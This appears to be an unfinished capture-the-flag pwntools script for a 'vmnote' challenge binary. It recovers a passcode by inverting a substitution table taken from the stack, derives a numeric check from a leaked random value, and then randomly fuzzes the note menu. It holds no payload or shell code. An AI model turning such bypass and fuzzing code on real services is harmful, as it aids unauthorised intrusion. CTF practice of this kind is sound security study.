from signal import pause
from pwn import*
from random import randint, random
context(log_level="debug",arch="amd64")
p=process("./vmnote")
gdb.attach(p)
pause()
# try solve passcode
# 先 break 到第一次 ret 的位置,此时栈上从0x1000 开始的信息在 extracted_stack 文件中
# passcode 1. 长度大于 0x11 reg1 是 given_rand
stack1=[218, 179, 148, 171, 119, 96, 184, 110, 192, 93, 154, 165, 95, 46, 76, 181, 98, 239, 185, 231, 168, 72, 195, 60, 22, 67, 31, 8, 219, 230, 217, 201, 56, 92, 2, 61, 125, 251, 3, 246, 176, 190, 134, 216, 19, 48, 89, 229, 208, 147, 145, 9, 194, 81, 4, 177, 65, 213, 113, 236, 32, 7, 250, 207, 85, 204, 146, 133, 127, 200, 49, 94, 223, 33, 163, 245, 55, 71, 186, 120, 254, 174, 62, 43, 37, 25, 151, 64, 252, 78, 132, 167, 225, 241, 140, 88, 143, 144, 161, 211, 215, 122, 45, 13, 100, 14, 53, 105, 189, 221, 224, 166, 235, 155, 234, 87, 206, 35, 30, 121, 40, 170, 75, 6, 103, 227, 18, 77, 175]
# 0x58b1230458d793d0   0x5123d0ead0d5931e 0x58 提取 stack2
stack2=[0xd0,0x93,0xd7,0x58,0x04,0x23,0xb1,0x58,0x1e,0x93,0xd5,0xd0,0xea,0xd0,0x23,0x51,0x58]
def passcode_encode(passcode,reg1):
    qword1=passcode[17:25]
    qword1=u64(qword1)
    qword1-=0x12345678
    assert(qword1==reg1)
    # 0x739 调用的时候 %0 是 buffer_offset %1 是0x101f %2 是 0x11
    for i in range(0x11):
        passcode[i]=stack1[passcode[i]]
    for i in range(0x11):
        assert(passcode[i]==stack[0x1120+i])

def new(idx,siz,content):
    p.recvuntil("choice>> ")
    p.sendline("1")
    p.recvuntil("idx: ")
    p.sendline(str(idx))
    p.recvuntil("size: ")
    p.sendline(str(siz))
    p.recvuntil("content: ")
    p.send(content)
def show(idx):
    p.recvuntil("choice>> ")
    p.sendline("2")
    p.recvuntil("idx: ")
    p.sendline(str(idx))
def delete(idx):
    p.recvuntil("choice>> ")
    p.sendline("4")
    p.recvuntil("idx: ")
    p.sendline(str(idx))
# decode passcode
s=b""
for i in range(17):
    c=stack2[i]
    for j in range(256):
        if stack1[j]==c:
            s+=p8(j)
            break
l=p.recvline()
rand_num=int(l.split()[-1])
print(rand_num)
num2=rand_num+0x12345678
print(hex(num2))
s+=str(num2).encode("latin-1") # 这里不能发 p64 啊啊啊 因为代码里面调用的是 atoi 函数
p.recvuntil("passcode: ")
p.sendline(s)
cnt=0
s=""
flag_inuse = [0,0,0,0,0]

while True:
        p.recv(timeout=0.01)
        cnt +=1
        if cnt%2000==0:
            break
    #try:
        opcode = randint(1,3)
        idx=randint(0,4)
        siz=randint(1,0x100)
        content="1"*siz
        if opcode==1:
            if flag_inuse[idx]==0:
                flag_inuse[idx]=1
            else:
                continue
            p.sendline(str(1).encode())
            p.sendline(str(idx).encode())
            p.sendline(str(siz).encode())
            p.send(content)
            pass
        if opcode==2:
            p.sendline(str(2).encode())
            p.sendline(str(idx).encode())
            pass
        if opcode==3:
            p.sendline(str(4).encode())
            p.sendline(str(idx).encode())
            flag_inuse[idx]=0
            pass

        pass
    # except Exception as e:
    #     print(s)
    #     print(e)
p.interactive()